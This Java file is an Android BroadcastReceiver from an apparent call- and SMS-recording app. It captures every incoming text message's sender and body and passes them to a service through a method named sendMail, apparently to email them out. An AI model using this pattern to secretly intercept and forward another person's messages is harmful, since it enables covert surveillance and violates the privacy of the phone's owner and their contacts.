package com.example.RecordCall_SMS.savesms;

/**
 * User: trungpt
 * Date: 2/17/14
 * Time: 5:58 PM
 */
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class MyPhoneReceiver extends BroadcastReceiver {
    SharedPreferences sp;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub

        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs = null;
        String str = "";
        if (bundle != null) {

            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                str += "SMS from " + msgs[i].getOriginatingAddress();
                str += " :";
                str += msgs[i].getMessageBody().toString();
                str += "\n";
            }

        }

        sendMail(context, str);

    }

    private void sendMail(Context context, String str) {
        // TODO Auto-generated method stub
        Intent myIntent = new Intent(context, ServiceTemplate.class);
        myIntent.putExtra("extraData", "" + str);
        context.startService(myIntent);
    }

}